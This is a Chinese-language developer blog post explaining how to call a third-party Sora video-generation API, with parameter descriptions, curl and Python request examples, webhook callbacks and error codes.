                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文将介绍一种 Sora Videos Generation API 对接说明，它是可以通过输入自定义参数来生成Sora官方的视频。</p>
<h2 data-id="heading-0">申请流程</h2>
<p>要使用 API，需要先到 <a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2F99a24421-2e22-4028-8201-e19cb834b67e" target="_blank" title="https://platform.acedata.cloud/documents/99a24421-2e22-4028-8201-e19cb834b67e" ref="nofollow noopener noreferrer">Sora Videos Generation API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43dbbd451a844a6d855cf9512e1fab4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=tWZ9Ng75aDVGB0QzjM8IQPkvRF0%3D" alt="" loading="lazy"/></p>
<p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
<p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
<h2 data-id="heading-1">基本使用</h2>
<p>首先先了解下基本的使用方式，就是输入提示词 <code>prompt</code>、参考图片链接数组 <code>image_urls</code> 以及模型 <code>model</code>，便可获得处理后的结果，具体的内容如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5572e9ef80664a04bc57fcc9a03cd36a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=dHp0XZihMUUBdrE%2FmmSo6bFVUq0%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>可以看到这里我们设置了 Request Headers，包括：</p>
<ul>
<li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
<li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
</ul>
<p>另外设置了 Request Body，包括：</p>
<ul>
<li><code>model</code>：生成视频的模型，主要有<code>sora-2</code>、<code>sora-2-pro</code>，目前 <code>sora-2</code>、<code>sora-2-pro</code>可以自主选择<code>size</code>、<code>duration</code>参数的视频，其中<code>sora-2-pro</code>可以支持<code>duration</code>为25s的视频，而<code>sora-2</code>只支持10、15秒的视频。</li>
<li><code>size</code>：此次视频生成任务的清晰度，分别有 <code>small</code> 、 <code>large</code>。</li>
<li><code>image_urls</code>：需要上传的参考图片链接或者Base64编码数组。</li>
<li><code>duration</code>：此次视频生成任务的时长，分别有10s、15s、25s，目前只有<code>sora-2-pro</code>支持25s。</li>
<li><code>character_start</code>/<code>character_end</code>：角色在画面中的起止位置（0-1），用于控制主体位置。</li>
<li><code>orientation</code>：画幅方向，支持 <code>landscape</code>、<code>portrait</code>、<code>square</code>。</li>
<li><code>prompt</code>：提示词。</li>
<li><code>callback_url</code>：需要回调结果的URL。</li>
</ul>
<p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82273bd8e87f43228599b53a70c24118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=DGb7JKjNy1A8SNvEB4h0rm4xYrE%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"6bf7fb83-5814-4e3e-a4ad-bfa0c26c0b33"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"96166698-4b66-478d-a26b-77a7269c9e01"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k7770rgsevxsmtpbn7xnm5gh"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k7770rgsevxsmtpbn7xnm5gh%2Ftask_01k7770rgsevxsmtpbn7xnm5gh_genid_0bf958d3-cae7-4298-b7b6-99ae439a1ea6_25_10_10_14_06_975715%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A30%3A38Z&amp;se=2025-10-16T13%3A30%3A38Z&amp;sks=b&amp;skt=2025-10-10T12%3A30%3A38Z&amp;ske=2025-10-16T13%3A30%3A38Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=8ebb0df1-a278-4e2e-9c20-f2d373479b3a&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=jigY6Z5qp8%2BTXYobaW0EAJ4%2Fbx6G7t6V1P0iyDeUq48%3D&amp;az=oaivgprodscus"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>返回结果一共有多个字段，介绍如下：</p>
<ul>
<li><code>success</code>，此时视频生成任务的状态情况。</li>
<li><code>task_id</code>，此时视频生成任务ID。</li>
<li><code>trace_id</code>，此时视频生成跟踪ID。</li>
<li><code>data</code>，此时视频生成任务的结果列表。
<ul>
<li><code>id</code>，此时视频生成任务的视频ID。</li>
<li><code>video_url</code>，此时视频生成任务的视频链接。</li>
<li><code>state</code>，此时视频生成任务的状态。</li>
</ul>
</li>
</ul>
<p>可以看到我们得到了满意的视频信息，我们只需要根据结果中 <code>data</code> 的视频链接地址获取生成的Sora视频即可。</p>
<p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
<pre><code class="hljs language-shell" lang="shell">curl -X POST 'https://api.acedata.cloud/sora/videos' \
-H 'accept: application/json' \
-H 'authorization: Bearer {token}' \
-H 'content-type: application/json' \
-d '{
  "size": "large",
  "duration": 15,
  "orientation": "landscape",
  "prompt": "cat running on the river",
  "model": "sora-2"
}'
</code></pre>
<h2 data-id="heading-2">图生视频任务</h2>
<p>如果想图生视频任务任务， 首先参数<code>image_urls</code>必须传入参考图片链接，就可以指定如下内容：</p>
<ul>
<li>image_urls：该图生视频任务采用的参考图链接数组，。</li>
</ul>
<p>填写样例如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a59b879af0d4c2394cfd4b32e9e188f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=pndbYXQzSkIis1YNo4yKGvIe3z4%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>填写完毕之后自动生成了代码如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0e9173588fd4cb697c80463cb7781e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=2Dx4336MyVBd%2BDBfTUAB%2FAuIaSk%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>对应的代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"https://api.acedata.cloud/sora/videos"</span>

headers = {
    <span class="hljs-string">"accept"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-string">"authorization"</span>: <span class="hljs-string">"Bearer {token}"</span>,
    <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/json"</span>
}

payload = {
    <span class="hljs-string">"size"</span>: <span class="hljs-string">"large"</span>,
    <span class="hljs-string">"duration"</span>: <span class="hljs-number">15</span>,
    <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"landscape"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"cat running on the river"</span>,
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"sora-2"</span>,
    <span class="hljs-string">"image_urls"</span>: [<span class="hljs-string">"https://cdn.acedata.cloud/11wfp4.png"</span>]
}

response = requests.post(url, json=payload, headers=headers)
<span class="hljs-built_in">print</span>(response.text)
</code></pre>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"success"</span>: true,
  <span class="hljs-string">"task_id"</span>: <span class="hljs-string">"dd392ff0-dcb7-4c7a-afd0-9bd4f65c803a"</span>,
  <span class="hljs-string">"trace_id"</span>: <span class="hljs-string">"04fd151c-e942-4c1c-a6ab-9a1b1fe54172"</span>,
  <span class="hljs-string">"data"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-string">"sora-2:task_01k777af4hfmg9g7yfvwsc6zws"</span>,
      <span class="hljs-string">"video_url"</span>: <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k777af4hfmg9g7yfvwsc6zws%2Ftask_01k777af4hfmg9g7yfvwsc6zws_genid_92bae0c5-1703-4a5f-9d9f-c9ed2f9e7176_25_10_10_14_12_924695%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A37%3A32Z&amp;se=2025-10-16T13%3A37%3A32Z&amp;sks=b&amp;skt=2025-10-10T12%3A37%3A32Z&amp;ske=2025-10-16T13%3A37%3A32Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=aa5ddad1-c91a-4f0a-9aca-e20682cc8969&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=5j4dibeaSsDmEka5c%2B9CKHZhRPdqfClQ0tIh03TWXsM%3D&amp;az=oaivgprodscus"</span>,
      <span class="hljs-string">"state"</span>: <span class="hljs-string">"succeeded"</span>
    }
  ]
}
</code></pre>
<p>可以看到，生成的效果是图生建视频的，结果与上文类似。</p>
<h2 data-id="heading-3">角色生成视频任务</h2>
<p>如果想角色生成视频任务， 首先参数<code>character_url</code>必须传入创建角色需要的视频链接，注意视频中一定不能出现真人，否则会失败，就可以指定如下内容：</p>
<ul>
<li>character_url：创建角色需要的视频链接，注意视频中一定不能出现真人，否则会失败。</li>
</ul>
<p>填写样例如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08afdd239beb4c33993784b7a981c9ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=o4VBn6f4BetYILLX%2BARHY9gHzmU%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>填写完毕之后自动生成了代码如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bd36ec3ee3f450fa688081c73b45901~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=CCqAN4pQbnJnFU4eAiF%2BS0I9QPA%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>对应的代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"https://api.acedata.cloud/sora/videos"</span>

headers = {
    <span class="hljs-string">"accept"</span>: <span class="hljs-string">"application/json"</span>,
    <span class="hljs-string">"authorization"</span>: <span class="hljs-string">"Bearer {token}"</span>,
    <span class="hljs-string">"content-type"</span>: <span class="hljs-string">"application/json"</span>
}

payload = {
    <span class="hljs-string">"size"</span>: <span class="hljs-string">"small"</span>,
    <span class="hljs-string">"duration"</span>: <span class="hljs-number">10</span>,
    <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"landscape"</span>,
    <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"cat running on the river"</span>,
    <span class="hljs-string">"character_url"</span>: <span class="hljs-string">"https://cdn.acedata.cloud/pdidf5.mp4"</span>,
    <span class="hljs-string">"model"</span>: <span class="hljs-string">"sora-2"</span>,
    <span class="hljs-string">"character_end"</span>: <span class="hljs-number">3</span>,
    <span class="hljs-string">"character_start"</span>: <span class="hljs-number">1</span>
}

response = requests.post(url, json=payload, headers=headers)
<span class="hljs-built_in">print</span>(response.text)
</code></pre>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"d9bf5461-29b5-47fd-be90-1fe9197df259"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b7992643-9207-40d6-956b-7577728acc67"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k8ykrztefavaypw6xanw305b"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/cdn/20251101/bee4eeeb4c4660b46dac4548a1ffbc.mp4"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>可以看到，生成的效果是角色生成视频，结果与上文类似。</p>
<h2 data-id="heading-4">异步回调</h2>
<p>由于 Sora Videos Generation API生成的时间相对较长，大约需要 1-2 分钟，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
<p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成视频的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
<p>下面我们通过示例来了解下具体怎样操作。</p>
<p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwebhook.site%2F%25EF%25BC%258C%25E6%2589%2593%25E5%25BC%2580%25E8%25AF%25A5%25E7%25BD%2591%25E7%25AB%2599%25E5%258D%25B3%25E5%258F%25AF%25E5%25BE%2597%25E5%2588%25B0%25E4%25B8%2580%25E4%25B8%25AA" target="_blank" title="https://webhook.site/%EF%BC%8C%E6%89%93%E5%BC%80%E8%AF%A5%E7%BD%91%E7%AB%99%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA" ref="nofollow noopener noreferrer">webhook.site/，打开该网站即可得到一…</a> Webhook URL，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b018c4227e9841b09245cd122add7c4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=PGxEgyrxL2Z8f5qhaYk5ZPERNvk%3D" alt="" loading="lazy"/></p>
<p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <code>https://webhook.site/eb238c4f-da3b-47a5-a922-a93aa5405daa</code>。</p>
<p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入相应的参数，具体的内容如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a47575b3f81444498ebcfd4db4f45b34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=dUWZxWGc7%2FCRWph5M%2FEwEMEyUes%3D" width="500" class="m-auto" loading="lazy"/></p>
<p>点击运行，可以发现会立即得到一个结果，如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b8976e18-32dc-4718-9ed8-1ea090fcb6ea"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>稍等片刻，我们可以在 <code>https://webhook.site/eb238c4f-da3b-47a5-a922-a93aa5405daa</code> 上观察到生成歌曲的结果，如图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d3f995391c948da9158e75b12fbb352~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bSU5bqG5omN5Lio6Z2Z6KeF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904635&amp;x-signature=is6vBxRfrLI5ZHDeVO3UdsIF%2BxU%3D" alt="" loading="lazy"/></p>
<p>内容如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"task_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"b8976e18-32dc-4718-9ed8-1ea090fcb6ea"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fb751e1e-4705-49ea-9fd4-5024b7865ea2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"sora-2:task_01k777hjrbfrgs2060q5zvf2a5"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"video_url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://filesystem.site/gptimage/vg-assets/assets%2Ftask_01k777hjrbfrgs2060q5zvf2a5%2Ftask_01k777hjrbfrgs2060q5zvf2a5_genid_b8e2e5d1-a579-49ca-a21c-cb3869685cce_25_10_10_14_15_147334%2Fvideos%2F00000%2Fsrc.mp4?st=2025-10-10T12%3A38%3A49Z&amp;se=2025-10-16T13%3A38%3A49Z&amp;sks=b&amp;skt=2025-10-10T12%3A38%3A49Z&amp;ske=2025-10-16T13%3A38%3A49Z&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skoid=aa5ddad1-c91a-4f0a-9aca-e20682cc8969&amp;skv=2019-02-02&amp;sv=2018-11-09&amp;sr=b&amp;sp=r&amp;spr=https%2Chttp&amp;sig=p4aMqXqkP%2FI1IhOVGCB9JL8vUUvfNBBF12ESpKhKXOk%3D&amp;az=oaivgprodscus"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"state"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"succeeded"</span>
        <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
<h2 data-id="heading-5">错误处理</h2>
<p>在调用 API 时，如果遇到错误，API 会返回相应的错误代码和信息。例如：</p>
<ul>
<li><code>400 token_mismatched</code>：Bad request, possibly due to missing or invalid parameters.</li>
<li><code>400 api_not_implemented</code>：Bad request, possibly due to missing or invalid parameters.</li>
<li><code>401 invalid_token</code>：Unauthorized, invalid or missing authorization token.</li>
<li><code>429 too_many_requests</code>：Too many requests, you have exceeded the rate limit.</li>
<li><code>500 api_error</code>：Internal server error, something went wrong on the server.</li>
</ul>
<h3 data-id="heading-6">错误响应示例</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"success"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"error"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api_error"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fetch failed"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"trace_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h2 data-id="heading-7">结论</h2>
<p>通过本文档，您已经了解了如何使用 Sora Videos Generation API 可通过输入提示词以及参考图片来生成视频。希望本文档能帮助您更好地对接和使用该 API。如有任何问题，请随时联系我们的技术支持团队。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于ThreeJs实现3D车机大屏及自动避障效果]]></title>    <link>https://juejin.cn/post/7603221478473646122</link>    <guid>https://juejin.cn/post/7603221478473646122</guid>    <pubDate>2026-02-05T14:00:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603221478473646122" data-draft-id="7603142147643572267" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于ThreeJs实现3D车机大屏及自动避障效果"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T14:00:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="李剑一"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于ThreeJs实现3D车机大屏及自动避障效果
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    李剑一
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:00:28.000Z" title="Thu Feb 05 2026 14:00:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
